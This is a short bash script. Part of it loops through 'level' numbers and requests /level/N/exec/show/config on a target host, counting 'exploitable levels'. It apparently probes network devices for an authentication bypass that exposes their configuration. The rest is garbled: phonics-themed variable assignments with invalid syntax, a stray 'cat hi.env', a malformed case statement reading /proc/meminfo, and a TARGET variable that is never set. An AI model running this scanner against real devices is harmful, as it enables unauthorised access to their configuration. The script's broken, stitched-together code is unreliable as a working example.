#!/bin/bash

phonemes = $p 
consonants = $c
rcontrol = $r
digraphs = $d
lvowels = $l
vowels = $v
diphthongs =$di
cat hi.env

target='';
FETCH="/usr/bin/fetch"
LEVEL=16 # Start Level
EXPLOITABLE=0 # Counter
while [ $LEVEL -lt 100 ]; do
CMD="${FETCH} http://${TARGET}/level/${LEVEL}/exec/show/config"
echo; echo ${CMD}
if (${CMD}) then
EXPLOITABLE=`expr ${EXPLOITABLE} + 1`
fi
LEVEL=`expr $LEVEL + 1`
done;
echo; echo All done
echo "${EXPLOITABLE} exploitable levels"

while read line; do
    case $line in
    phonemes) = $p 
    consonants) = $c
    rcontrol) = $r
    digraphs) = $d
    lvowels) = $l
    vowels) = $v
    diphthongs) =$di
    esac
  done </proc/meminfo
